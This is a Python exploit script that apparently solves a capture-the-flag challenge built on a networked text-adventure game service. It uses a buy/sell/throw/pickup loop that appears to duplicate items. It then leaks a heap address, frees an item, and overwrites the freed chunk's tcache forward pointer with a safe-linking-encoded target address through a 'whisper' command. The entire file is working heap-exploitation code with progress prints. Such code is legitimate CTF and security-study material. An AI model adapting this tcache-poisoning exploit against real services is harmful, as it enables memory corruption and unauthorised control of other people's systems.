#!/usr/bin/env python3
import socket, time, re, struct, sys
HOST=sys.argv[1]; PORT=int(sys.argv[2]); TARGET=int(sys.argv[3],16)
def connect(tries=80):
    for i in range(tries):
        s=socket.socket(); s.settimeout(4)
        try: s.connect((HOST,PORT))
        except Exception: time.sleep(3); continue
        s.settimeout(2); b=b""
        try:
            while True:
                d=s.recv(4096)
                if not d: break
                b+=d
                if b"Great Plateau" in b: return s,b
        except Exception: pass
        s.close(); time.sleep(4)
    return None,None
def rx(s,pats,timeout=2.0):
    if isinstance(pats,str): pats=[pats]
    end=time.time()+timeout; out=b""
    while time.time()<end:
        s.settimeout(max(0.05,end-time.time()))
        try: d=s.recv(65536)
        except Exception: break
        if not d: out+=b"<EOF>"; break
        out+=d
        if any(p in out.decode('utf-8','replace') for p in pats): break
    return out.decode('utf-8','replace')
def cmd(s,c,pats,t=2.0):
    s.sendall(c.encode()+b"\n"); time.sleep(0.03); return rx(s,pats,t)
def drain(s,t=0.9):
    time.sleep(t); s.settimeout(1.5); o=b""
    try:
        while True:
            d=s.recv(65536)
            if not d: o+=b"<EOF>"; break
            o+=d
    except Exception: pass
    return o.decode('utf-8','replace')
def items(s):
    s.sendall(b"inv list\n"); time.sleep(0.3); s.settimeout(1.5); o=b""
    try:
        while True:
            d=s.recv(65536)
            if not d: o+=b"<EOF>"; break
            o+=d
            if b"Inventory" in o and o.count(b"type=")>=1: 
                time.sleep(0.05)
                try:
                    while True:
                        d=s.recv(65536)
                        if not d: break
                        o+=d
                except Exception: pass
                break
    except Exception: pass
    t=o.decode('utf-8','replace'); r=[]
    for m in re.finditer(r"\[(\d+)\]\s+#(\d+)\s+([^|]+)\|\s+type=([^|]+)\|",t):
        r.append((int(m.group(1)),int(m.group(2)),m.group(3).strip(),m.group(4).strip()))
    return r
def show(s):
    s.sendall(b"mw show\n"); time.sleep(0.3); s.settimeout(1.5); o=b""
    try:
        while True:
            d=s.recv(65536)
            if not d: o+=b"<EOF>"; break
            o+=d
            if b"Drops:" in o: break
    except Exception: pass
    return o.decode('utf-8','replace')
s,b=connect()
if s is None: print("NO BANNER"); sys.exit(1)
for i in range(5):
    cmd(s,"shop buy 1 1",["tx: item added","not enough"])
    cmd(s,"inv equip 1",["tx: main world equipped","invalid"])
    cmd(s,"shop sell 1",["shop sold","invalid"])
    cmd(s,"mw throw 0",["throws equipped item","invalid"])
    cmd(s,"mw pickup 0",["tx: item added","invalid"])
    cmd(s,"shop sell 1",["shop sold","invalid"])
    time.sleep(0.2)
cmd(s,"shop buy 3 34",["tx:","not enough"],3)
cmd(s,"map teleport castle",["Encounter"])
cmd(s,"battle",["player turn"])
cmd(s,"use item",["Enter inventory idx"])
cmd(s,"1",["Enter quantity"])
cmd(s,"34",["Battle won"],4)
cmd(s,"mw pickup 0",["tx: item added","invalid"])
cmd(s,"inv equip 1",["tx: main world equipped","invalid"])
o=show(s); m=re.search(r"description_addr=0x([0-9a-f]+)",o)
if not m: print("NO RING"); sys.exit(1)
base=int(m.group(1),16); print("[base] 0x%x"%base,flush=True)
print("[A] "+str(items(s)),flush=True)
# drop tree branch (slot0)
cmd(s,"inv drop 0",["tx: inventory frees","invalid"],2); drain(s,1.0)
print("[B] "+str(items(s)),flush=True)
# buy bomb
cmd(s,"shop buy 3 1",["tx:","not enough"],2); drain(s,0.6)
it=items(s); print("[C] "+str(it),flush=True)
# find ring slot and bomb slot
ring=[x[0] for x in it if "Ring" in x[3] and "notepad" not in x[2] and "The Ring" in x[2]]
bomb=[x[0] for x in it if "Bomb" in x[3]]
print("[slots] ring=%s bomb=%s"%(ring,bomb),flush=True)
if not ring or not bomb: print("SETUP FAIL"); sys.exit(1)
rs=ring[0]
# drop ring -> base into transaction tcache
cmd(s,"inv drop %d"%rs,["tx: inventory frees","invalid"],2); drain(s,1.0)
fd=TARGET^(base>>12)
cmd(s,"mw whisper 0 "+struct.pack("<Q",fd).hex(),["whispered","only"],3)
o=show(s); m=re.search(r"description_head=0x([0-9a-f]+)",o)
print("[poison] "+(m.group(1) if m else "?")+" expect "+hex(fd),flush=True)
# pickup ring clone
cmd(s,"mw pickup 1",["tx: item added","invalid"],2); drain(s,0.6)
it=items(s); print("[D] "+str(it),flush=True)
bs=[x[0] for x in it if "Bomb" in x[3]]
rs=[x[0] for x in it if "The Ring" in x[2]]
if not bs or not rs: print("PICKUP FAIL"); sys.exit(1)
drop_slot=bs[0]
print("[decouple] drop bomb slot %d + sort"%drop_slot,flush=True)
s.sendall(("inv drop %d\ninv sort\n"%drop_slot).encode())
o=drain(s,1.4); print("[dec out] "+repr(o[-240:]),flush=True)
o=show(s); m=re.search(r"description_head=0x([0-9a-f]+)",o)
print("[head after dec] "+(m.group(1) if m else "?")+" want 0x%x"%TARGET,flush=True)
# normal drop of whatever ring we have to pop T
it=items(s); rs=[x[0] for x in it if "The Ring" in x[2]]
print("[E] "+str(it)+" ringslots=%s"%rs,flush=True)
s.close()
